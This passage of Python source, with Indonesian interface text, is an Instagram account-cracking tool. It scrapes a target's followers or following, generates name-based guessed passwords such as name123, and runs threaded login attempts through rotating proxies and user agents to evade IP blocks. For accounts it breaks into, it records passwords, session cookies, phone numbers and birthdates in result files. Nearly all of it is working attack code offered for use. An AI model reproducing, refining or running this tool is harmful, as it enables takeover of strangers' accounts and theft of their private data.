				prints(Panel(f'{P2}Username Yang Anda Masukan Tidak Di Temukan Atau Akun Private',width=90,padding=(0,7),style=f"bold white"));exit()
			return internal
		else:lisensi()
		
	def ifoAPI(self,cookie,api,id):
		if 'sukses' in  lisensiku:
			try:
				x=s.get(api%(id),cookies=cookie,headers={"user-agent":BrayennnXD()})
				x_jason=json.loads(x.text)
				for i in x_jason['users']:
					username = i["username"]
					nama = i["full_name"]
					internal.append(f'{username}|{nama}')
					following.append(username)
				if 'mengikuti' in menudump:
					maxid=x_jason['next_max_id']
					for z in range (9999):
						x=s.get('https://www.instagram.com/api/v1/friendships/'+id+'/following/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":BrayennnXD()})
						x_jason=json.loads(x.text)
						try:
							for i in x_jason['users']:
								username = i["username"]
								nama = i["full_name"]
								internal.append(f'{username}|{nama}')
								following.append(username)
							try:
								maxid=x_jason['next_max_id']
							except:
								break
						except:
							if 'challenge' in x.text:
								break
							else:
								continue
				else:pass
			except requests.exceptions.ConnectionError:
				prints(Panel(f'{P2}Koneksi Internet Anda Bermasalah Silahkan Cek Dan Coba Lagi Masuk Ke Tools',width=90,style=f"bold white"));time.sleep(3);exit()
			except Exception as e:
				prints(Panel(f'{P2}Username Yang Anda Masukan Tidak Di Temukan Atau Akun Private',width=90,padding=(0,7),style=f"bold white"));exit()
			return internal
		else:lisensi()
		
#------------------[ PILIH METODE AND PASSWORD ]-------------------#
	def ifo(self):
		urut = []
		urut.append(Panel(f"{P2}[[bold cyan]01{P2}] Methode API ",padding=(0,11),style=f"bold white"))
		urut.append(Panel(f"{P2}[[bold cyan]02{P2}] Methode AJAX",padding=(0,11),style=f"bold white"))
		console.print(Columns(urut))
		
	def passwordAPI(self,xnx):
		prints(Panel(f"{P2}   Total Username Terkumpul : {color_rich}{len(internal)}",width=90,padding=(0,20),style=f"bold white"))
		self.ifo()
		u = input(f' [+] Pilih Metode: ')
		if u in ["1","01"]:
			method.append('satu')
		elif u in ["2","02"]:
			method.append('dua')
		else:
			method.append('satu')
		prints(Panel(f"{P2}[[bold cyan]01{P2}] Name,Name123,Name1234\n[[bold cyan]02{P2}] Name,Name123,Name1234,Name12345\n[[bold cyan]03{P2}] Name,Name123,Name1234,Name12345,Name123456\n[[bold cyan]04{P2}] Name,Name12,Name123,Name1234,Name12345,Name123456\n[[bold cyan]05{P2}] Password Manual",width=90,padding=(0,3),title='List Password',style=f"bold white"))
		c=input(f'{N} [+] Masukan Pilihan :{C} ')
		if c in ['1','01']:
			self.generateAPI(xnx,c)
		elif c in ['2','02']:
			self.generateAPI(xnx,c)
		elif c in ['3','03']:
			self.generateAPI(xnx,c)
		elif c in ['4','04']:
			self.generateAPI(xnx,c)
		elif c in ['5','05']:
			prints(Panel(f"{P2}Masukan Password Manual Minimal Password 6 Karakter Jangan Sampe Kurang\nContoh Password : Indonesia,Bengkulu123,Papua1234",width=90,style=f"bold white"))
			zx=input(f' [+] Masukan Password : ')
			self.generateAPI(xnx,c,zx)
		else:
			self.passwordAPI(xnx)
			
	def generateAPI(self,user,o,zx=''):
		global prog,des
		xxkontol.append(Panel(f"""{H2}Hasil OK Ter Simpan Di {P2}:{P2}{day}.txt""",width=45,style=f"bold white"))
		xxkontol.append(Panel(f"""{K2}Hasil CP Ter Simpan Di {P2}:{P2}{day}.txt""",width=45,style=f"bold white"))
		console.print(Columns(xxkontol))
		prints(Panel(f"{P2}           Crack Di Mulai Tekan {color_rich}'Ctrl+Z'{P2} Di Keyboard Anda Jika Ingin Berhenti\n\n                  {P2}Hidupkan Mode Pesawat 5 Detik Jika Terdeteksi Spam IP",width=90,padding=(0,4),style=f"bold white"))
		anims = random.choice(["clock","smiley","monkey","moon","earth"])
		prog = Progress(SpinnerColumn(f'{anims}'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
		des = prog.add_task('',total=len(internal))
		with prog:
			with ThreadPoolExecutor(max_workers=15) as shinkai:
				for i in user:
					try:
						username=i.split("|")[0]
						password=i.split("|")[1].lower()
						for w in password.split(" "):
							if len(w)<3:
								continue
							else:
								w=w.lower()
								if o=="1":
									if len(w)==3 or len(w)==4 or len(w)==5:
										sandi=[w,w+'123',w+'1234',w+'321']
									else:
										sandi=[w,w+'123',w+'1234',w+'321']
								elif o=="2":
									if len(w)==3 or len(w)==4 or len(w)==5:
										sandi=[w,w+'123',w+'1234',w+'12345']
									else:
										sandi=[w,w+'123',w+'1234',w+'12345', password.lower()]
								elif o=="3":
									if len(w)==3 or len(w)==4 or len(w)==5:
										sandi=[w,w+'123',w+'1234',w+'321',w+'4321',w+'12345',w+'123456',password.lower()]
									else:
										sandi=[w,w+'123',w+'1234',w+'321',w+'4321',w+'12345',w+'123456',password.lower()]
								elif o=="4":
									if len(w)==3 or len(w)==4 or len(w)==5:
										sandi=[w,w+'123',w+'1234',w+'12',w+'321',w+'234',w+'4321',w+'12345',w+'123456',w+'1234567',password.lower()]
									else:
										sandi=[w,w+'123',w+'1234',w+'1',w+'2',w+'321',w+'4321',w+'12345',w+'123456',password.lower()]
								elif o=="5":
									if len(zx) > 3:
										sandi = zx.replace(" ", "").split(",")
							if 'satu' in method:
								shinkai.submit(self.crackAPI,username,sandi)
							elif 'dua' in method:
								shinkai.submit(self.new,username,sandi)
#										break
#					shinkai.submit(self.crackAPI,username,sandi)
					except:
						pass
		prints(Panel(f"  {P2}Crack {color_rich}{len(internal)} {P2}Username Selesai Hasil OK : {H2}{len(success)}{P2} Hasil CP : {K2}{len(checkpoint)}{P2} ",width=90,padding=(0,8),style=f"bold white"));time.sleep(4);exit()

	def APIinfo(self,user):
		try:
			x=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
			x_jason=x.json()["data"]["user"]
			nama=x_jason["full_name"]
			pengikut=x_jason["edge_followed_by"]["count"]
			mengikut=x_jason["edge_follow"]["count"]
			postingan=x_jason["edge_owner_to_timeline_media"]["count"]
		except:
			pass

		return nama,pengikut,mengikut,postingan

#------------------[ METODE API V1 ]-------------------#
	def crackAPI(self,user,pas):
		global loop,success,checkpoint
		ses=requests.Session()
		ua = random.choice(UserBrayCrack)
		prog.update(des,description=f"{H2}[API]{P2} {loop}/{len(internal)} OK-:{H2}{len(success)}{P2} CP-:{K2}{len(checkpoint)}{P2}")
		prog.advance(des)
		try:
			for pw in pas:
				brayennnxd=random.randint(1000000000, 99999999999)
				ts = calendar.timegm(current_GMT)
				proxy = {'http': 'socks5://'+random.choice(proxxy)}
				p = ses.get('https://i.instagram.com/api/v1/web/accounts/login/ajax/')
				head = {
                    'Host': 'i.instagram.com',
                    'Connection': 'keep-alive',
                    'Content-Length': '314',
                    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
                    'X-IG-App-ID': '1217981644879628',
                    'X-IG-WWW-Claim': '0',
                    'sec-ch-ua-mobile': '?1',
                    'X-Instagram-AJAX': '8a5016770d5c',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Accept': '*/*',
                    'X-Requested-With': 'XMLHttpRequest',
                    'X-ASBD-ID': '198387',
                    'User-Agent': ua,
                    'X-CSRFToken': p.cookies['csrftoken'],
                    'sec-ch-ua-platform': '"Android"',
                    'Origin': 'https://i.instagram.com',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Dest': 'empty',
                    'Referer': 'https://i.instagram.com/',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'}
				data = {
				    "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
				    "username": user,
				    "queryParams": "{}",
				    "optIntoOneTap": 'false',
				    "stopDeletionNonce": "",
				    "trustedDeviceRecords": "{}"}
				respon=ses.post("https://i.instagram.com/api/v1/web/accounts/login/ajax/", headers = head, data = data, proxies = proxy, allow_redirects = False)
				brayennnxd=json.loads(respon.text)
				if 'userId' in str(brayennnxd):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					cookie = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
					nomor, tanggal = self.ingfo(cookie)
					tree = Tree("")
					tree.add(Panel.fit(f"{H2}{user} {P2}| {H2}{pw}"))
					tree.add(f"{P2}Followers : {H2}{pengikut}")
					tree.add(f"{P2}Following : {H2}{mengikut}")
					tree.add(f"{P2}Nomor HP  : {H2}{nomor}")
					tree.add(f"{P2}Postingan : {H2}{postingan}")
					tree.add(f"{P2}Tanggal Lahir : {H2}{tanggal}").add(f"{N2}{cookie}{P2}\n")
					prints(tree)
					open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					success.append(user)
					break

				elif 'href="https://www.instagram.com/challenge/action/' in str(brayennnxd):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					tree = Tree("")
					tree.add(Panel.fit(f"{K2}{user} {P2}| {K2}{pw}"))
					tree.add(f"{P2}Followers : {K2}{pengikut}")
					tree.add(f"{P2}Following : {K2}{mengikut}")
					tree.add(f"{P2}Postingan : {K2}{postingan}").add(f"{K2}{USN}\n")
					prints(tree)
					open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					checkpoint.append(user)
					break
				elif "ip_block" in str(respon.text):
					prog.update(des,description=f"{M2}SpamIP{P2} {loop}/{len(internal)} OK-:{H2}{len(success)}{P2} CP-:{K2}{len(checkpoint)}{P2}")
					prog.advance(des)
					time.sleep(10)
					self.crackAPI(user,pas)
				else:
					continue
			loop+=1
		except requests.ConnectionError:
			time.sleep(10)
			
			
#------------------[ METODE API V2 ]-------------------#
	def new(self,user,pas):
		global loop,success,checkpoint
		ses=requests.Session()
		ua = random.choice(UserBrayCrack)
		prog.update(des,description=f"{H2}[AJAX]{P2} {loop}/{len(internal)} OK-:{H2}{len(success)}{P2} CP-:{K2}{len(checkpoint)}{P2}")
		prog.advance(des)
		try:
			for pw in pas:
				brayennnxd=random.randint(1000000000, 99999999999)
				ts = calendar.timegm(current_GMT)
				proxy = {'http': 'socks5://'+random.choice(proxxy)}
				p = ses.get('https://www.instagram.com/web/__mid')
				ses.headers.update({
                    'Host':'www.instagram.com',
                    'x-ig-www-claim':'0',
                    'x-instagram-ajax':'6543adcc6d29',
                    'content-type':'application/x-www-form-urlencoded',
                    'accept':'*/*',
                    'x-requested-with':'XMLHttpRequest',
                    'x-asbd-id':'198387',
                     'user-agent':ua,
                     'x-csrftoken':p.cookies['csrftoken'],
                     'x-ig-app-id':'1217981644879628',
                     'origin':'https://www.instagram.com',
                     'sec-fetch-site':'same-origin',
                     'sec-fetch-mode':'cors',
                     'sec-fetch-dest':'empty',
                     'referer':'https://www.instagram.com/accounts/onetap/',
                     'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})         
				data = {
           "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
			"username": user,
			"queryParams": "{}",
			"optIntoOneTap": 'false',
			"stopDeletionNonce": "",
			"trustedDeviceRecords": "{}"}
				respon=ses.post("https://www.instagram.com/accounts/login/ajax/", data=data, allow_redirects=True)
				brayennnxd=json.loads(respon.text)
				if 'userId' in str(brayennnxd):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					cookie = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
					nomor, tanggal = self.ingfo(cookie)
					tree = Tree("")
					tree.add(Panel.fit(f"{H2}{user} {P2}| {H2}{pw}"))
					tree.add(f"{P2}Followers : {H2}{pengikut}")
					tree.add(f"{P2}Following : {H2}{mengikut}")
					tree.add(f"{P2}Nomor HP  : {H2}{nomor}")
					tree.add(f"{P2}Postingan : {H2}{postingan}")
					tree.add(f"{P2}Tanggal Lahir : {H2}{tanggal}").add(f"{N2}{cookie}{P2}\n")
					prints(tree)
					open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					success.append(user)
					break

				elif 'href="https://www.instagram.com/challenge/action/' in str(brayennnxd):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					tree = Tree("")
					tree.add(Panel.fit(f"{K2}{user} {P2}| {K2}{pw}"))
					tree.add(f"{P2}Followers : {K2}{pengikut}")
					tree.add(f"{P2}Following : {K2}{mengikut}")
					tree.add(f"{P2}Postingan : {K2}{postingan}").add(f"{K2}{USN}\n")
					prints(tree)
					open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					checkpoint.append(user)
					break
				elif "ip_block" in str(respon.text):
					prog.update(des,description=f"{M2}SpamIP{P2} {loop}/{len(internal)} OK-:{H2}{len(success)}{P2} CP-:{K2}{len(checkpoint)}{P2}")
					prog.advance(des)
					time.sleep(10)
					self.new(user,pas)
				else:
					continue
			loop+=1
		except requests.ConnectionError:
			time.sleep(10)
			
	def checkAPI(self,usr,pwd):
		try:
			ts = calendar.timegm(current_GMT)
			ses=requests.Session()
			proxy = {'http': 'socks5://'+random.choice(prox_xyaa)}
			ua_brayen = USN
			token=s.get("https://i.instagram.com/accounts/login",headers={"user-agent":self.ua_igeh()}).content
			crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
			s.headers.update({
				'authority': 'www.instagram.com',
				'connection': 'keep-alive',
				'sec-ch-ua': '";Not A Brand";v="99", "Chromium";v="94"',
				'x-ig-app-id': '1217981644879628',
                'x-ig-www-claim': 'hmac.AR3jlStdcYspw88nLWvVnCDdiZ-KPvru_TasoSJlzGz-iXV2',
                 'x-requested-with': 'XMLHttpRequest',
				'sec-ch-ua-mobile': '?1',
				'x-instagram-ajax': 'c6412f1b1b7b',
				'content-type': 'application/x-www-form-urlencoded',
				'accept': '*/*',
				'x-csrftoken': crf_token,
				'user-agent': ua_brayen,
				'x-asbd-id': '198387',
				'sec-ch-ua-platform': '"Android"',
				'origin': 'https://www.instagram.com',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-mode': 'cors',
				'sec-fetch-dest': 'empty',
				'referer': 'https://www.instagram.com/',
				'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
			})

			param={
				"enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pwd}",
					"username": usr,
					"optIntoOneTap": False,
					"queryParams": "{}",
					"stopDeletionNonce": "",
					"trustedDeviceRecords": "{}"
			}
			x=s.post("https://i.instagram.com/accounts/login/ajax/",data=param,proxies=proxy)
			x_jason=json.loads(x.text)
			if "userId" in x.text:
				nama,pengikut,mengikut,postingan=self.APIinfo(usr)
				print(f"""
    ├ {CY} Live{N}
	├ {CY}{usr}|{pwd}
	├ Followers {CY}{pengikut}
	├ Following {CY}{mengikut}
	├ Posts
	 ∟ jumlah Post {CY}{postingan}""")
			elif 'checkpoint_url' in x.text:
				nama,pengikut,mengikut,postingan=self.APIinfo(usr)
				print(f"""
    ├ {K}Checkpoint{N}
	├ {K}{usr}|{pwd}
	├ Followers {K}{pengikut}
	├ Following {K}{mengikut}
	├ Posts
     ∟ jumlah Post {K}{postingan}""")
			elif 'Please Wait A Few Minutes' in str(x.text):
				sys.stdout.write(f"\r {U}!{C}] {U}Please Wait A Few Minutes Second{C}");sys.stdout.flush();sleep(10)
				self.checkAPI(usr,pwd)
		except:
			self.checkAPI(usr,pwd)

	def menu(self):
		self.logo()
		c=input(f' [+] Pilih : ')
		if c=='':
			prints(Panel(f"{P2}Pilih Yang Bener Broo Jangan Kosong !",width=90,padding=(0,19),style=f"bold white"));time.sleep(3);exit()
		elif c in ('1','01'):
			error()

		elif c in ('2','02'):
			mas=input(f' [+] Apakah Anda Ingin Crack Masal Y/t : ')
			if mas in ['y','Y']:
				masal(self)
			elif mas in ['t','T']:
				massal(self)
			elif mas in ['']:
				print(" Y/t Bro Jangan Kosong")


		elif c in ('3','03'):
			mas=input(f' [+] Apakah Anda Ingin Crack Masal Y/t : ')
			if mas in ['y','Y']:
				mengi(self)
			elif mas in ['t','T']:
				meng(self)
			elif mas in ['']:
				print(" Y/t Bro Jangan Kosong")


		elif c in ('4','04'):
			error()
			
		elif c in ('5','05'):
			print('')
			for i in os.listdir('result'):
				prints(Panel(f"{P2}Hasil Crack : {color_rich}{i}",width=90,style=f"bold white"))
			c=input(f' [+] Masukan Nama File : ')
			g=open("result/%s"%(c)).read().splitlines()
			xx=c.split("-")
			xc=xx[0]
			print(f' Total Results : {H}{len(g)}{C}')
			for s in g:
				usr=s.split("|")[0]
				pwd=s.split("|")[1]
				fol=s.split("|")[2]
				ful=s.split("|")[3]
				if xc=="checkpoint":
					print(f"""
 [+] Checkpoint :
 [+] Username: {usr}
 [+] Password: {pwd}
 [+] Followers: {fol}
 [+] Following: {ful}
					""");sleep(0.05)
				else:
					print(f"""
 [+] Live :
 [+] Username : {usr}
 [+] Password : {pwd}
 [+] Pengikut : {fol}
 [+] Mengikuti : {ful}
					""");sleep(0.05)
		elif c in ('6','06'):
			error()
		elif c in ('0','00'):
			self.Exit() 
	

		else:
			exit()

#----------[ CRACK MASSAL MENGIKUTI ]---------- #
def mengi(self):
			try:
				menudump.append('mengikuti')
				m=int(input(f' [+] Jumlah Target : {N}'))
			except:m=1
			prints(Panel(f"{P2}Pastikan Username Target Yang Di Pilih Bersifat Publik Dan Jangan Private",width=90,style=f"bold white"))
			for t in range(m):
				t +=1
				nama=input(f' [+] Username Target : {C}')
				id=self.idAPI(self.cookie,nama)
				info=self.ifoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
			self.passwordAPI(info)

#-----------------[ CRACK MENGIKUTI ]-----------------#
def meng(self):
	try:
		menudump.append('mengikuti')
		prints(Panel(f"{P2}Pastikan Username Target Yang Di Pilih Bersifat Publik Dan Jangan Private",width=90,style=f"bold white"))
		m=input(f' [+] Username Target : ')
		print(f" [+] Wait Collect Username {m}")
		id=self.idAPI(self.cookie,m)
		info=self.ifoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
		self.passwordAPI(info)
	except Exception as e:
		print(e)

#-----------------[ CRACK MASSAL PENGIKUT ]----------------- #
def masal(self):
			try:
				menudump.append('pengikut')
				m=int(input(f' [+] Jumlah Target : {N}'))
			except:m=1
			prints(Panel(f"{P2}Pastikan Username Target Yang Di Pilih Bersifat Publik Dan Jangan Private",width=90,style=f"bold white"))
			for t in range(m):
				t +=1
				nama=input(f' [+] Username Target : {C}')
				id=self.idAPI(self.cookie,nama)
				info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
			self.passwordAPI(info)

#-----------------[ CRACK PENGIKUT ]-----------------#
def massal(self):
			menudump.append('pengikut')
			prints(Panel(f"{P2}Pastikan Username Target Yang Di Pilih Bersifat Publik Dan Jangan Private",width=90,style=f"bold white"))
			m=input(f' [+] Username Target : {C}')
			print(f" [+] Wait Collect Username {m}")
			id=self.idAPI(self.cookie,m)
			info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
			self.passwordAPI(info)
			
#-----------------[ DEF MAKEDIRECTORY ]-----------------#
def makedirectory():
	try:os.mkdir('data')
	except:pass
	try:os.system('result')
	except:pass
	loginCookie()

if __name__ == '__main__':
	os.system("git pull")
	makedirectory()
